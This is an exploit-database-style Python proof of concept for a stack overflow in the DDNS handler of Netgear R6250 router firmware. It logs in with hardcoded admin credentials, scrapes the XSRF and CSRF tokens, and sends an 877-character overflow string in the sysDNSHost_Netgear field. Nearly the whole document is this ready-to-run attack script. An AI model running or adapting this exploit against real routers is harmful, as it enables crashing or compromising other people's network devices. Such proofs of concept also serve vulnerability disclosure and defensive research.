# Exploit Title: Router Netgear-R6250 - stack overflow
# Date: 20-5-2023
# Exploit Author: d2y6p
# Firmware: R6250V1.0.4.48
# CVE: N/A

#!/usr/bin/python3

import requests
import re
import base64

target = '192.168.1.1'
username = 'admin'
passwd = 'Qwer1234'
username_passwd = username + ":" + passwd
auth = base64.b64encode(username_passwd.encode('utf-8')).decode("utf-8")
print(auth)

#request 1 : get XSRF_TOKEN
burp0_url = "http://" + target + ":80/IPV6_fixed.htm"
burp0_cookies = {"XSRF_TOKEN": "2267229739"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic 123123", "Connection": "close", "Referer": "http://" + target + "/IPV6_disable.htm", "Upgrade-Insecure-Requests": "1"}
response1 = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

if 'Set-Cookie' in response1.headers:
    set_cookie = response1.headers['Set-Cookie']
    print(f'The Set-Cookie value is: {set_cookie}')
else:
    print('No Set-Cookie field in the response header')

pattern = r'(?<=\=)([^;]*)'
XSRF_TOKEN = re.findall(pattern, set_cookie)[0]
print(XSRF_TOKEN)

#request 2 : get ddns_cgi_csrf_id
burp0_url = "http://" + target + ":80/DNS_ddns.htm"
burp0_cookies = {"XSRF_TOKEN": XSRF_TOKEN}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic " + auth, "Connection": "close", "Referer": "http://" + target + "/IPV6_disable.htm", "Upgrade-Insecure-Requests": "1"}
response2 = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
pattern = r'cgi\?id=([\w\d]+)'
ddns_cgi_csrf_id = re.search(pattern, response2.text).group(1)
print("ddns_cgi_csrf_id is :" + ddns_cgi_csrf_id)

#request 3 : send payload
burp0_url = "http://" + target + ":80/ddns.cgi?id=" + ddns_cgi_csrf_id
burp0_data = {"NRegister": "\xe6\xb3\xa8\xe5\x86\x8c", "sysDNSActive": "dnsEnable", "sysDNSProviderlist": "4", "sysDNSHost": '', "sysDNSUser": '', "sysDNSPassword": "Qwer1234", "account": "no", "sysDNSHost_Netgear": "A"*877, "sysDNSEmail_Netgear": "123@qq.com", "sysDNSPassword_Netgear": "123qwe", "tos_chk": "tosEnable", "sysDNSHost_Netgear_account": '', "sysDNSEmail_Netgear_account": '', "sysDNSPassword_Netgear_account": '', "host_graycheck": "0", "email_graycheck": "0", "password_graycheck": "0", "tos_graycheck": '', "success_status": "2"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "text/plain", "Origin": "http://" + target, "Authorization": "Basic " + auth, "Connection": "close", "Referer": "http://" + target + "/VLAN_IPTV.htm", "Upgrade-Insecure-Requests": "1"}

response3 = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)


#request 4 :
burp0_url = "http://" + target + ":80/OPENVPN.htm"
response4 = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

#print(response3.text)

print('end!!!')
